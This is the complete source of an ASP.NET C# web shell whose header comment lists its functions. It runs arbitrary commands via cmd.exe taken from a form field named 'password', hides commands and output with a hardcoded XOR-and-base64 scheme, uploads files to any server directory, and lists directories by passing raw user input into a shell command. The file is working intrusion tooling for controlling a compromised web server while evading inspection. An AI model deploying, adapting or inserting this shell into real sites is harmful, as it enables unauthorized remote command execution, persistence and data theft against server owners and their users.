<!--
Functions of the shell:
    - Execute command which is the value of ''password'' parameter. It is encrypted (xor + base64 encode) before being sent.
    - Upload a file to a directory.
    - Scan a directory with `dir`.
-->

<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
    string key = "thisiskey";

    void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.Form["password"];
        string result = "<h3>Execute command | File upload web shell</h3>";
        if(!String.IsNullOrEmpty(cmd))
        {
            result = encrypt(ExcuteCmd(decrypt(cmd, key)), key);
        }
        Response.Write(result);
    }

    string encrypt(string str, string key)
    {
        return ToBase64Encode(xor(str, key));
    }

    string decrypt(string str, string key)
    {
        return xor(ToBase64Decode(str), key);
    }

    string ToBase64Encode(string text)
    {
        if (String.IsNullOrEmpty(text))
        {
            return text;
        }

        byte[] textBytes = Encoding.UTF8.GetBytes(text);
        return Convert.ToBase64String(textBytes);
    }

    string ToBase64Decode(string base64EncodedText)
    {
        if (String.IsNullOrEmpty(base64EncodedText))
        {
            return base64EncodedText;
        }

        byte[] base64EncodedBytes = Convert.FromBase64String(base64EncodedText);
        return Encoding.UTF8.GetString(base64EncodedBytes);
    }

    string xor(string str1, string str2)
    {
        string output = "";
        for (int i = 0; i < str1.Length; i++)
        {
            output += (char) (str1[i] ^ str2[i % str2.Length]);
        }
        return output;
    }

    string ExcuteCmd(string arg)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + arg;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();
        return s;
    }

    protected void btnsave_Click(object sender, EventArgs e)
    {
        String save_name;
        StringBuilder mess = new StringBuilder();

        if(FileUpload1.HasFile)
        {
            try
            {
                // Get directory to save file
                // If directory doesn't exist, try to create
                // Fail -> get current dir
                save_name = @FileLocation.Text.Replace("\"","") + "\\";
                if (!Directory.Exists(save_name))
                {
                    if(!String.IsNullOrEmpty(save_name))
                    {
                        try
                        {

                            Directory.CreateDirectory(save_name);
                        }
                        catch (Exception ex)
                        {
                            mess.Append("<br/>Error create directory: " + ex.Message);
                        }
                    } else
                    {
                        save_name = Directory.GetCurrentDirectory() + "\\";
                        mess.Append("<br/>Save to current directory: " + save_name);
                    }
                }

                save_name += htmlEncode(FileUpload1.FileName);
                FileUpload1.SaveAs(save_name);
                mess.Append("<br/>Upload successfully. Path to file: " + save_name);

            } catch (Exception ex)
            {
                mess.Append("<br/>Fail upload file: " + ex.Message);
            }
            ResultLabel.InnerHtml = htmlEncode(mess.ToString());
        }

    }

    protected void btnscan_Click(object sender, EventArgs e)
    {
        String s = ExcuteCmd("dir " + @FileLocation.Text);
        ResultLabel.InnerHtml = htmlEncode(s);
    }

    protected string htmlEncode(string output)
    {
        return Server.HtmlEncode(output.Replace("\n", "<br/>")).Replace("&lt;br/&gt;", "<br/>");
    }


</script>
<html>
    <body>
        <form id="form_file_upload" runat="server" method="post">
        <div>
            File: <asp:FileUpload ID="FileUpload1" runat="server" /><br />
            Directory: <asp:TextBox id="FileLocation" runat="server" placeholder="Leave blank for current dir"/>
            <br />
            Submit: <asp:Button ID="btnsave" runat="server" onclick="btnsave_Click" 
                Text="Upload file" Width="121px" />
            <asp:Button ID="btnscan" runat="server" onclick="btnscan_Click" 
                Text="Scan Given Directory" Width="204px" /> <br />
            <br /><br />
        </div>
        <h3>Result</h3>
        <div id="ResultLabel" runat="server" style="width:40%; height:60%">
        </div>
        
    </form>
    </body>
</html>
